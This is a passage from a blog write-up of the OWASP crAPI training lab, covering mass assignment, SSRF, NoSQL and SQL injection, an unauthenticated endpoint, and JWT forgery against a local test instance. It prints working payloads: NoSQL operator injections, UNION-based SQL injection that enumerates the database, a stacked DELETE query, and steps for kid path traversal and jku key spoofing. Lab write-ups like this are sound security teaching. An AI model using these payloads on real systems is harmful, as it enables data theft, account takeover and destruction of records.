with error</p><p><img data-src="/assets/images/621f2798d5f378445aeb758d6f5a925fdf7f345c722153b2f558157311f775d8.png" alt="picture 8" data-proofer-ignore></p><p>Video with <code class="language-plaintext highlighter-rouge">32</code> ID belongs to another user. Error message says we should use admin API, and if we do that, we can delete the video.</p><p><img data-src="/assets/images/b2ef892e87075d3c97f28fb15ec7821110bc3a79af94da9bae260b8d564a3690.png" alt="picture 9" data-proofer-ignore></p><ul><li>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/identity/api/v2/admin/videos/:id</code></ul><h2 id="6-mass-assignment">6. Mass Assignment<a href="#6-mass-assignment" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>For <strong>Mass Assignment</strong> i wanted to try some automation using <code class="language-plaintext highlighter-rouge">arjun</code>, but actually more than that, i wanted to quickly have a list of host+endpoints which i could use for different tools. I’ve exported the collection from Postman and used gron+grep+sed+awk+sort to get a list.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre> luka@yokai  ~/crapi_vapi  gron crapi_flow\ Mitmproxy2Swagger.postman_collection.json | fgrep "originalRequest.url.raw" | awk -F"=" '{print $2}' | sed 's//http:\/\/crapi.local:8888/' | cut -d'"' -f2| sed 's//v1/' | sort -u
http://crapi.local:8888/community/api/v1/community/posts
http://crapi.local:8888/community/api/v1/community/posts/recent
http://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7B
http://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7B/comment
http://crapi.local:8888/community/api/v1/coupon/validate-coupon
http://crapi.local:8888/identity/api/auth/login
http://crapi.local:8888/identity/api/auth/signup
http://crapi.local:8888/identity/api/v1/user/change-email
http://crapi.local:8888/identity/api/v1/user/dashboard
http://crapi.local:8888/identity/api/v1/user/pictures
http://crapi.local:8888/identity/api/v1/user/reset-password
http://crapi.local:8888/identity/api/v1/user/verify-email-token
http://crapi.local:8888/identity/api/v1/user/videos
http://crapi.local:8888/identity/api/v1/user/videos/:id
http://crapi.local:8888/identity/api/v1/user/videos/:id?video_id
http://crapi.local:8888/identity/api/v1/vehicle/add_vehicle
http://crapi.local:8888/identity/api/v1/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location
http://crapi.local:8888/identity/api/v1/vehicle/resend_email
http://crapi.local:8888/identity/api/v1/vehicle/vehicles
http://crapi.local:8888/workshop/api/mechanic/
http://crapi.local:8888/workshop/api/merchant/contact_mechanic
http://crapi.local:8888/workshop/api/shop/orders
http://crapi.local:8888/workshop/api/shop/orders/:id
http://crapi.local:8888/workshop/api/shop/orders/:id?order_id
http://crapi.local:8888/workshop/api/shop/products
</pre></table></code></div></div><p>I would now just fix the IDs and create a list for <code class="language-plaintext highlighter-rouge">v2</code> and <code class="language-plaintext highlighter-rouge">v3</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cat hosts_crapi.txt | sed 's/v1/v2/' | anew hosts_crapi.txt
cat hosts_crapi.txt | sed 's/v1/v3/' | anew hosts_crapi.txt
</pre></table></code></div></div><h3 id="challenge-8---get-an-item-for-free">Challenge 8 - Get an item for free<a href="#challenge-8---get-an-item-for-free" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can set status to <code class="language-plaintext highlighter-rouge">returned</code> by using PUT method</p><p><img data-src="/assets/images/d402cce6823cfc862a02c96563be41b1606531ade02dc78ce23bb464efa26d6d.png" alt="picture 12" data-proofer-ignore>.</p><p>Funds will be returned.</p><p>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/workshop/api/shop/orders/:id</code> (PUT)</p><h3 id="challenge-9---increase-your-balance-by-1000-or-more">Challenge 9 - Increase your balance by $1,000 or more<a href="#challenge-9---increase-your-balance-by-1000-or-more" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We can use negative numbers to increase our balance.</p><p><img data-src="/assets/images/8bfea667585e85c8570cfed78bd9be9ed2cbd9f3f7be8fea24141b38408cff64.png" alt="picture 10" data-proofer-ignore></p><p>We can also create new product with negative numbers that will increase funds on our balance.</p><p><img data-src="/assets/images/f25571cd1c270deafe8ab3675426bab3fdbd7a5c36a14c5ecd802110d33b409e.png" alt="picture 11" data-proofer-ignore></p><p>Vulnerable Endpoint:</p><ul><li><code class="language-plaintext highlighter-rouge">/workshop/api/shop/orders</code> (POST)<li><code class="language-plaintext highlighter-rouge">/workshop/api/shop/products</code> (POST)</ul><h3 id="challenge-10---update-internal-video-properties">Challenge 10 - Update internal video properties<a href="#challenge-10---update-internal-video-properties" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>In the following Mass Assignment vulnerability it is possible to change parameter which isn’t included in the default request.</p><p><img data-src="/assets/images/b8695872e0e6bd77a266d844e4d327a2fdf45f84480ed2a49be4f38042ef6caf.png" alt="picture 13" data-proofer-ignore></p><p>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/identity/api/v2/user/videos/:id</code> (PUT)</p><h2 id="7-injections">7. Injections<a href="#7-injections" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ssrf---challenge-11---make-crapi-send-an-http-call-to-wwwgooglecom-and-return-the-http-response">(SSRF) - Challenge 11 - Make crAPI send an HTTP call to “www.google.com” and return the HTTP response.<a href="#ssrf---challenge-11---make-crapi-send-an-http-call-to-wwwgooglecom-and-return-the-http-response" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>SSRF happens where we can enter another URL which will be visited from the server side.</p><p><img data-src="/assets/images/22f5e4aa47410383c97319b3d584b2b8223522af4638fcc7e8573ea0d39a19b6.png" alt="picture 14" data-proofer-ignore></p><p>… and i can see corresponding request on <code class="language-plaintext highlighter-rouge">webhook.site</code>.</p><p><img data-src="/assets/images/60c8e1a2d13290210e2fe93c9f0614f1b35ca1741923118306d5ace2b5871af4.png" alt="picture 15" data-proofer-ignore></p><p>We can also see authorization header leak, as well as all parameters.</p><p>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/workshop/api/merchant/contact_mechanic</code> (POST - <code class="language-plaintext highlighter-rouge">mechanic_api</code>)25</p><h3 id="nosqli---challenge-12---find-a-way-to-get-free-coupons-without-knowing-the-coupon-code">(NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code.<a href="#nosqli---challenge-12---find-a-way-to-get-free-coupons-without-knowing-the-coupon-code" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>After running NOSQLi Payloads through collection runner which was set like this:</p><p><img data-src="/assets/images/22775ffa7fa0ff90ed915da3254e5fec86ae3803c61848c611a9de447d768f98.png" alt="picture 19" data-proofer-ignore></p><p>Only potential vulnerable requests were chosen. Injection that caught my attention was <code class="language-plaintext highlighter-rouge">"coupon":{"gt":""}</code>.</p><p>I’ve sent the request to Burp and this is the wordlist that i’ve used.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>"coupon_code[$ne]":1
"coupon_code[$regex]":"^adm"
"coupon_code[$regex]":".{25}"
"coupon_code[$eq]":"admin"
"coupon_code[$ne]":"admin"
"coupon_code[$nin][admin]":"admin"
"coupon_code[$regex]":".*"
"coupon_code[$exists]":true
"coupon_code": {"$ne": null} 
"coupon_code": {"$ne": "foo"} 
"coupon_code": {"$gt": undefined}
"coupon_code": {"$gt":""}
</pre></table></code></div></div><p>We can see that we get coupon in response:</p><p><img data-src="/assets/images/3270a127cbc98c90c66c2654b01234863de3bf910542b9db17f2180b728fb66e.png" alt="picture 17" data-proofer-ignore></p><p>We can even get a better one:</p><p><img data-src="/assets/images/480a996240b7e9c8e0738c81d4d62de3d3fdc452676d2f4bd2f0eda22ce9902f.png" alt="picture 18" data-proofer-ignore></p><p>Vulnerable Endpoint: <code class="language-plaintext highlighter-rouge">/community/api/v2/coupon/validate-coupon</code> (POST - “coupon_code”)</p><h3 id="sqli---challenge-13---find-a-way-to-redeem-a-coupon-that-you-have-already-claimed-by-modifying-the-database">(SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database<a href="#sqli---challenge-13---find-a-way-to-redeem-a-coupon-that-you-have-already-claimed-by-modifying-the-database" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>We’ve found some coupons <em>in previous challenge</em>.</p><p><img data-src="/assets/images/85d7a8a57287f5199d12dcb5d53a3da8053c24cf3403c7db1d68ea0819bb5059.png" alt="picture 23" data-proofer-ignore></p><p>We’ve redeemed those and now we cannot redeem same token anymore? Not a problem. Endpoint is vulnerable to SQL Injection.</p><p><img data-src="/assets/images/39a97ab3f114094d55ea56d5515cf1f84770bea163de2978c5cec579825d7333.png" alt="picture 24" data-proofer-ignore></p><p><em>From here, i’ll just post body from each request</em></p><h4 id="getting-databases">Getting Databases<a href="#getting-databases" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>{"coupon_code":"blind' UNION ALL select string_agg(datname,',') FROM pg_database OFFSET 0--","amount":125}

{"message":"postgres,crapi,template1,template0 Coupon code is already claimed by you!! Please try with another coupon code"}
</pre></table></code></div></div><h4 id="getting-tables-all">Getting Tables (all)<a href="#getting-tables-all" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>{"coupon_code":"blind' UNION ALL SELECT string_agg(table_name,',') FROM information_schema.tables --","amount":125}

{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,pg_statistic,pg_type,user_login,otp,django_migrations,pg_foreign_table,pg_authid,pg_shadow,pg_statistic_ext_data,pg_roles,mechanic,service_request,pg_settings,pg_file_settings,pg_hba_file_rules,product,order,applied_coupon,pg_config,pg_shmem_allocations,pg_backend_memory_contexts,pg_available_extension_versions,health_check_db_testmodel,pg_user_mapping,pg_stat_xact_user_functions,pg_replication_origin_status,pg_subscription,pg_attribute,pg_proc,pg_class,pg_attrdef,pg_constraint,pg_inherits,pg_index,pg_operator,pg_opfamily,pg_opclass,pg_am,pg_amop,pg_amproc,pg_language,pg_stat_archiver,pg_stat_bgwriter,pg_stat_wal,pg_stat_progress_analyze,pg_stat_progress_vacuum,pg_stat_progress_cluster,pg_stat_progress_create_index,pg_stat_progress_basebackup,pg_stat_progress_copy,pg_largeobject_metadata,...SNIP...applicable_roles,administrable_role_authorizations,check_constraint_routine_usage,character_sets,check_constraints,collations,collation_character_set_applicability,column_column_usage,column_domain_usage,routines,column_privileges,role_column_grants,column_udt_usage,columns,constraint_column_usage,routine_column_usage,...SNIP...,views,triggers,udt_privileges,foreign_data_wrappers,role_udt_grants,data_type_privileges,usage_privileges,role_usage_grants,user_defined_types,element_types,view_column_usage,view_routine_usage,_pg_foreign_servers,_pg_foreign_table_columns,column_options,_pg_foreign_data_wrappers,foreign_table_options,foreign_data_wrapper_options,foreign_server_options,foreign_servers,_pg_foreign_tables,user_mapping_options,foreign_tables,_pg_user_mappings Coupon code is already claimed by you!! Please try with another coupon code"}
</pre></table></code></div></div><h4 id="getting-columns-from-user_details">Getting columns from <code class="language-plaintext highlighter-rouge">user_details</code><a href="#getting-columns-from-user_details" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>{"coupon_code":"blind' UNION ALL SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='user_details' --","amount":125}

{"message":"id,available_credit,picture,user_id,name,status Coupon code is already claimed by you!! Please try with another coupon code"}
</pre></table></code></div></div><h4 id="finding-applied-coupons-columns">Finding applied coupons columns<a href="#finding-applied-coupons-columns" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>{"coupon_code":"blind' UNION ALL SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='applied_coupon' --","amount":125}

{"message":"id,user_id,coupon_code Coupon code is already claimed by you!! Please try with another coupon code"}
</pre></table></code></div></div><h4 id="dumping-applied-coupon-table">Dumping applied coupon table<a href="#dumping-applied-coupon-table" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"coupon_code":"blind' UNION ALL SELECT string_agg(concat(id||','||user_id||','||coupon_code),';') FROM applied_coupon --","amount":125}
</pre></table></code></div></div><h4 id="changing-values-in-the-row-updatedelete">Changing Values in the row UPDATE/DELETE<a href="#changing-values-in-the-row-updatedelete" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p>Now either modfy (UPDATE) the row or delete it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>UPDATE applied_coupon SET coupon_code='' WHERE user_id=8
</pre></table></code></div></div><p>DELETE the row with our user_id=8</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"coupon_code":"blind';DELETE FROM applied_coupon WHERE user_id=8 --","amount":125}
</pre></table></code></div></div><p>We’ll get Server Error but PSQL Query has been executed and we can apply our coupon again.</p><p><img data-src="/assets/images/2a3c640b28c9558db48d01a2715c489b4c7c491fd14acacc7b9454233abb43de.png" alt="picture 20" data-proofer-ignore></p><p>Output from SQLMAP:</p><p><img data-src="/assets/images/8600e45a5a2da0c071e2129579d65be961deeb81a646aae5b12ef997ac96f111.png" alt="picture 21" data-proofer-ignore></p><h3 id="unauthenticated-access---challenge-14---find-an-endpoint-that-does-not-perform-authentication-checks-for-a-user">(Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user.<a href="#unauthenticated-access---challenge-14---find-an-endpoint-that-does-not-perform-authentication-checks-for-a-user" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Running Collection in Postman <strong>without</strong> token has returned no 401/403 errors on following Endpoint:</p><ul><li><code class="language-plaintext highlighter-rouge">http://crapi.local:8888/workshop/api/mechanic/mechanic_report?report_id=1</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre> luka@yokai  ~/crapi_vapi  curl http://crapi.local:8888/workshop/api/mechanic/mechanic_report\?report_id\=15 -s | jq
{
  "id": 15,
  "mechanic": {
    "id": 1,
    "mechanic_code": "TRAC_JHN",
    "user": {
      "email": "jhon@example.com",
      "number": ""
    }
  },
  "vehicle": {
    "id": 28,
    "vin": "9XPLG11UTSQ720977",
    "owner": {
      "email": "luka@cybersec-research.space",
      "number": "123123123"
    }
  },
  "problem_details": "repair",
  "status": "Pending",
  "created_on": "21 January, 2023, 07:36:27"
}
</pre></table></code></div></div><h3 id="vulnerable-jwt---challenge-15---find-a-way-to-forge-valid-jwt-tokens">(Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT Tokens<a href="#vulnerable-jwt---challenge-15---find-a-way-to-forge-valid-jwt-tokens" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>I highly suggest checking out <a href="https://portswigger.net/web-security/jwt">Portswigger’s Web Academy</a></p><h4 id="algorithm-confusion">Algorithm Confusion<a href="#algorithm-confusion" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p>Public Key has been found on <code class="language-plaintext highlighter-rouge">.well-known/jwks.json</code>. This will be used in Algorithm Confusion attack.</p><p><img data-src="/assets/images/a290021fdb301318e51ed5126244f71db0bfe6c403a94a7d66c90fc4a7ca4cc0.png" alt="picture 22" data-proofer-ignore></p><p>I will be using Burp’s <code class="language-plaintext highlighter-rouge">JWT Editor</code> extension which is also available for Community Edition.</p><p>Now let’s copy the key JWT Editor and create new <code class="language-plaintext highlighter-rouge">RSA</code> key.</p><p><img data-src="/assets/images/6bac536a8e3c5a86089096c509d2ce99ace1ff2b268cd71bf6ac4e1bf00b161f.png" alt="picture 25" data-proofer-ignore></p><p>Save the key and copy it’s public key in PEM format and BASE64 encode it.</p><p><img data-src="/assets/images/f21c9fb44c46ccc7bf5c28163a1bee028baf2b2d05c56e6e3f817f9200547b3d.png" alt="picture 26" data-proofer-ignore></p><p>Now create <code class="language-plaintext highlighter-rouge">New Symmetric Key</code> and copy the BASE64 encoded PEM public key into <code class="language-plaintext highlighter-rouge">k</code> value.</p><p>We should now be able to sign JWT tokens. (Sign as HS256! not RS256)</p><p><img data-src="/assets/images/a33fd6ef4127e80f763db0a22d6e8b14f6d3e0eeae740bfa4c414c1d4b35fa8c.png" alt="picture 27" data-proofer-ignore></p><p>Change <code class="language-plaintext highlighter-rouge">alg</code> to <code class="language-plaintext highlighter-rouge">HS256</code> and when signing <code class="language-plaintext highlighter-rouge">Don't modify header.</code></p><p><img data-src="/assets/images/7436b5aa99c49076c1589fb7ea1322d692ca67895cb75d3c23679cb202c75eeb.png" alt="picture 29" data-proofer-ignore></p><p>We can basically take over any account.</p><p><img data-src="/assets/images/cd3b3cde29e38c9f83bd019fa7cce413e4353a3053e8f1886e35b8b25c79f061.png" alt="picture 28" data-proofer-ignore></p><h4 id="invalid-signature-vulnerability">Invalid Signature Vulnerability<a href="#invalid-signature-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p>What we’ve done above is great but reality is that Signature isn’t really being verified, meaning we can take over any account and don’t even need to re-sign the JWT token. This can be tested simply by changing values like <code class="language-plaintext highlighter-rouge">sub</code> and JWT token will work.</p><h4 id="jku-misuse-vulnerability">JKU Misuse Vulnerability<a href="#jku-misuse-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p>The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.</p><p>For this attack, we’ll create a <code class="language-plaintext highlighter-rouge">New RSA Token</code> in <code class="language-plaintext highlighter-rouge">JWT Editor</code> and save it.</p><p><img data-src="/assets/images/2a754a2f8809297311b42fcf26053778e27573ca0fd426531eaf00e5f2658785.png" alt="picture 30" data-proofer-ignore></p><p>We’ll copy public key in PEM format</p><p><img data-src="/assets/images/50793dccef08fe158ed1e3e223b642999489fe76d0f41331d9d9d6dbaaaaef2e.png" alt="picture 31" data-proofer-ignore></p><p>… and paste the key on our web server in following format:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>{
  "keys:[
    KEY COMES HERE
  ]
}
</pre></table></code></div></div><p>Start the webserver (if not already running).</p><p>Using <code class="language-plaintext highlighter-rouge">JWT Editor</code> we can modify <code class="language-plaintext highlighter-rouge">jku</code>, <code class="language-plaintext highlighter-rouge">kid</code> and (if we want to) the <code class="language-plaintext highlighter-rouge">sub</code> values.</p><p><img data-src="/assets/images/1b666b52cd807bd3063612d71b3f20c178b277679798c742c5f23463445a34a0.png" alt="picture 33" data-proofer-ignore></p><p>When we sign and send a request, we should see traffic on our web server.</p><p><img data-src="/assets/images/79c36c98eb9591e2db4f5a2533be49df0c0e327c2c34b6ad9b80051f507d7c7a.png" alt="picture 32" data-proofer-ignore></p><p>Response should be successful.</p><p><img data-src="/assets/images/28f9a02fc92f34873b2e67994ac513346194ca37e80908823653c4dc77d3ba8d.png" alt="picture 34" data-proofer-ignore></p><h4 id="kid-path-traversal-vulnerability">KID Path Traversal Vulnerability<a href="#kid-path-traversal-vulnerability" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4><p>In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.</p><p>For this attack we’ll need <code class="language-plaintext highlighter-rouge">Symmetric Key</code> ready from <code class="language-plaintext highlighter-rouge">JWT Editor</code>.</p><p><img data-src="/assets/images/c37f2adf7aba95768e1b700e714d8459570661b178e15d67c14f92fac0a349e1.png" alt="picture 19" data-proofer-ignore></p><p>Exchange the <code class="language-plaintext highlighter-rouge">k</code> value with <code class="language-plaintext highlighter-rouge">AA==</code> (this is not necesarry for an attack, but it’s just workaround for Burp)</p><p><img data-src="/assets/images/2160a8f1a12444414a613d0c60a69c61048a3aaee391c842b922be84530e7940.png" alt="picture 36" data-proofer-ignore></p><p>We will have to add/change the values accordingly where <code class="language-plaintext highlighter-rouge">kid</code> is going to point to traversed <code class="language-plaintext highlighter-rouge">../../../../../../../../dev/null</code> and we’ll use our <code class="language-plaintext highlighter-rouge">Symmetric Key</code> to sign the JWT token.</p><p><img data-src="/assets/images/e096ab497a3423ee0b12582e425aee477440d882347fdffe45af3b4e63d08f3f.png" alt="picture 37" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-application/'>Web Application</a>, <a href='/categories/api/'>API</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/api/" class="post-tag no-text-decoration" >API</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Vulnerable Lab by OWASP - crAPI (Writeup) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/crAPI_writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Vulnerable Lab by OWASP - crAPI (Writeup) - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/crAPI_writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Vulnerable Lab by OWASP - crAPI (Writeup) - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/crAPI_writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/vapi_writeup/"><div class="card-body"> <em class="timeago small" date="2022-12-21 08:00:00 +0100" >Dec 21, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Vulnerable Lab by Tushar Kulkarni (@roottusk) - vAPI (writeup)</h3><div class="text-muted small"><p> Intro This post is all about the vapi which is hosted on github and it has been created by Tushar Kulkarni. The Plan This vulnerable API has no Frontend like e.g., craPI, so i’ll just take docum...</p></div></div></a></div><div class="card"> <a href="/posts/Blind_SQL_Injection/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Blind SQL Injection</h3><div class="text-muted small"><p> Intro Lab at portswigger: Blind SQL Injection TOC Intro TOC Blind SQL injection with conditional responses Intro Finding the SQL Injection Database Enumeration ...</p></div></div></a></div><div class="card"> <a href="/posts/Alternative_vulnerable_authentication_mechanismus/"><div class="card-body"> <em class="timeago small" date="2022-09-30 09:00:00 +0200" >Sep 30, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Other vulnerable Authentication Mechanismus</h3><div class="text-muted small"><p> Intro This post/writeup is all about the Authentication vulnerabilities or Broken Authentication if we follow OWASP naming scheme. I’ll be using primarily Portswigger Web Academy Labs, but i do in...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CORS/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - Cross-Origin Resource Sharing (CORS)</p></a> <a href="/posts/vapi_writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Vulnerable Lab by Tushar Kulkarni (@roottusk) - vAPI (writeup)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a 